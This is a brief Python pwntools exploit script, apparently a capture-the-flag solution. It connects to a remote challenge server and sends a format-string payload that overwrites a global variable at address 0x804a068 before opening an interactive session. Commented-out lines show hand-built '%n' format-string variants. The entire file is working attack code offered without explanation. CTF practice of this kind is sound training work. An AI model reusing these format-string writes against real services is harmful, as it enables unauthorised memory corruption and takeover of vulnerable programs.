from pwn import *
context(arch="i386",os="linux",log_level="debug")
pwnme_addr = 0x804a068
p =remote("111.198.29.45",57537)
#p = process("./pwn")
p.sendlineafter("name:","aaaa")
p.recvuntil("please:")
#payload="%08c%12nh"+p32(pwnme_addr)
payload = fmtstr_payload(10,{pwnme_addr:0x8})
print(payload)
#payload= p32(pwnme_addr) + 'aaaa' + '%10$n' 
p.send(payload)
#p.recvuntil("flag:\n")
p.interactive()
